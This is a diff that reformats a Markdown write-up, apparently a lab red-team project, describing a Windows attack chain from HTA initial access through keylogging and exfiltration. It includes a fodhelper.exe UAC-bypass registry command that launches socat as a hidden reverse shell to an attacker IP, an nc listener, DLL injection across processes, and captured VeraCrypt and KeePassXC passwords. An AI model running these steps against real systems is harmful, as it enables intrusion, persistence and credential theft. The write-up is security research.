@@ -178,9 +178,9 @@ Plan for now:
 Initial Access via HTA (gets triggered using PowerShell) -> Reverse shell connection + Persistence (low priv) -> Download "implant.exe" to victim + Execute -> Privilege Escalation using user:password credentials via RDP on UAC Bypass [Hi Priv Escalation] OR PsExec64.exe  -> Evasion: Hook for Process Creation + Rootkit tech -> Payload(MessageBox) == Hook for keyboard events + Capture keystrokes -> Saved log to a file -> Data Exfiltration using python uploader
 ```
 
-	- How can the HTA get executed via PowerShell in the first place?
+##### How can the HTA get executed via PowerShell in the first place?
 
-			- Social Engineering! Victims are meant to be tricked into executing it in PowerShell. (I guess depending on the context as well)
+	- Social Engineering! Victims are meant to be tricked into executing it in PowerShell. (I guess depending on the context as well)
 
 
 ### Malicious HTA Via Metasploit
@@ -199,7 +199,7 @@ Initial Access via HTA (gets triggered using PowerShell) -> Reverse shell connec
 
 ![](/assets/img/Pasted image 20230521182319.png)
 
-		- Notice that in the Metasploit framework, we can easily modify both the payload and the listener for the initial access to connect back on.
+- Notice that in the Metasploit framework, we can easily modify both the payload and the listener for the initial access to connect back on.
 
 <u>Victim's POV</u>:
 
@@ -240,28 +240,23 @@ Initial Access via HTA (gets triggered using PowerShell) -> Reverse shell connec
 
 ## **Privilege Escalation Technique to use**:
 
-- `UAC Bypass via Fodhelper.exe`
-
-		- This is chained with RDP access using the credentials "noob:password" acquired prior.
+- `UAC Bypass via Fodhelper.exe`: This is chained with RDP access using the credentials "noob:password" acquired prior.
 
 ### **Privilege Escalation via UAC Bypass - `fodhelper.exe` + RDP with `user:pass` combo** :
 
-```
-1. Creating a reverse shell listener on the attacker machine: "nc -lvnp <attacker-ip>"
-```
+##### 1. Creating a reverse shell listener on the attacker machine: "nc -lvnp <attacker-ip>"
 
 ![](/assets/img/Pasted image 20230521184743.png)
 
-```
-2. Check the privilege of the current user you have on the Initial Access: "net user <attacker> | find 'Local Group'"
-```
+##### 2. Check the privilege of the current user you have on the Initial Access: "net user <attacker> | find 'Local Group'"
 
 ![](/assets/img/Pasted image 20230521184715.png)
 
-	- The user 'noob' is a member of the Administrators group but we don't have a high privilege shell because of the UAC mechanism.
+- The user 'noob' is a member of the Administrators group but we don't have a high privilege shell because of the UAC mechanism.
+
+##### 3. Modifying the Registry to manipulate certain registry key used by "fodhelper.exe" service to execute a reverse shell: (Execute it with the Initial access Shell)
 
 ```
-3. Modifying the Registry to manipulate certain registry key used by "fodhelper.exe" service to execute a reverse shell: (Execute it with the Initial access Shell)
 		C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
 		C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.10.102.75:4444 EXEC:cmd.exe,pipes"
 		
@@ -291,7 +286,7 @@ Initial Access via HTA (gets triggered using PowerShell) -> Reverse shell connec
 
 ![](/assets/img/Pasted image 20230521185008.png)
 
-	- Note that doing this logs out the user 'noob' on their session so we want to modify the registry value and execute fodhelper.exe quickly.
+Note that doing this logs out the user 'noob' on their session so we want to modify the registry value and execute fodhelper.exe quickly.
 
 - Checking the commands to execute to modify the Registry `fodhelper.exe` use when it gets executed:
 
@@ -355,7 +350,7 @@ if ((Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server").
 
 ![](/assets/img/Pasted image 20230526113655.png)
 
-	- Just imagine this executed on Metasploit since that is where we should execute this script.
+The script should be run in Metasploit, as that is the appropriate platform for its execution.
 
 <u>Registry Editor</u>:
 
@@ -363,9 +358,7 @@ if ((Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server").
 
 - **ChatGPT** Explanation:
 
-```
 This command does the same thing as the function in the previous script. It checks the value of the `fDenyTSConnections` registry key. If it's 0, it means RDP is enabled, and the command prints "RDP is enabled". If it's not 0, it means RDP is disabled, and the command prints "RDP is disabled".
-```
 
 <u>Checking the RDP once you have RDP session</u>:
 
@@ -416,9 +409,9 @@ This command does the same thing as the function in the previous script. It chec
 
 ![](/assets/img/Pasted image 20230521190752.png)
 
-	- The `implant.exe` process disappeared and the MessageBox payload appears to which shows that the implant.dll got injected on all processes.
+- The `implant.exe` process disappeared and the MessageBox payload appears to which shows that the implant.dll got injected on all processes.
 
-	- In this case, the trigger is keyboard events on the alive processes.
+- In this case, the trigger is keyboard events on the alive processes.
 
 
 -----------------
@@ -429,15 +422,15 @@ This command does the same thing as the function in the previous script. It chec
 
 ![](/assets/img/Pasted image 20230521191035.png)
 
-	- Notice that it shows the Date and Time plus the Window to which the user was interacting with.
+- Notice that it shows the Date and Time plus the Window to which the user was interacting with.
 
-	- It also shows the specific keys the user typed in and the commands used in this example when the user typed in the commands:
+- It also shows the specific keys the user typed in and the commands used in this example when the user typed in the commands:
 
-			- whoami
+    - whoami
 
-			- pwd
+    - pwd
 
-	- in the Windows Powershell.
+in the Windows Powershell.
 
 
 ##### Case 1: Capturing credentials entered on Veracrypt.exe process 
@@ -450,13 +443,13 @@ This command does the same thing as the function in the previous script. It chec
 
 ![](/assets/img/Pasted image 20230521195801.png)
 
-<u>Capture Keystroke</u>:
+<u>Captured Keystroke</u>:
 
 ![](/assets/img/Pasted image 20230521200059.png)
 
-	- Although the capture keystrokes has added weird 'u' character, it shows that the keystroke is being captured by an attacker.
+- Although the capture keystrokes has added weird 'u' character, it shows that the keystroke is being captured by an attacker.
 
-	- The correct password is: "ResearchProject123!"
+- The correct password is: "ResearchProject123!"
 
 
 ##### Case 2: Capturing credentials entered on `KeePassXC`
@@ -480,17 +473,17 @@ This command does the same thing as the function in the previous script. It chec
 	- Password caught by the Keylogger!
 
 
-##### **Hiding** the `..\\secret\\output.txt` where to the data to be exfiltrated are in. 
+##### **Hiding** the `..\\secret\\output.txt` where the data to be exfiltrated are stored. 
 
 - `->` Make sure that the implant has the HIGH / MANDATORY privilege when typed in "`whoami /groups`" at the end. Otherwise it won't work. `[/]`
 
-- Note that although the "`..\\secret\\`" folder's contents is hidden to the user (GUI), with the reverse shell from the HTA Initial Access, we can exfiltrate the `\\secret\\output.txt` file from this reverse shell connection.
+- Although the "`..\\secret\\`" folder's contents is hidden to the user (GUI), with the reverse shell from the HTA Initial Access, we can exfiltrate the `\\secret\\output.txt` file from this reverse shell connection.
 
 - The file to be exfiltrated is in the directory: `C:\Users\noob\Downloads\secret`.
 
 ![](/assets/img/Pasted image 20230521191241.png)
 
-	- We don't want this to be visible to the user noob when it is browsing normally in the local machine.
+We don't want this to be visible to the user noob when it is browsing normally in the local machine.
 
 - Making sure that the malicious DLL got injected into the `explorer.exe`:
 
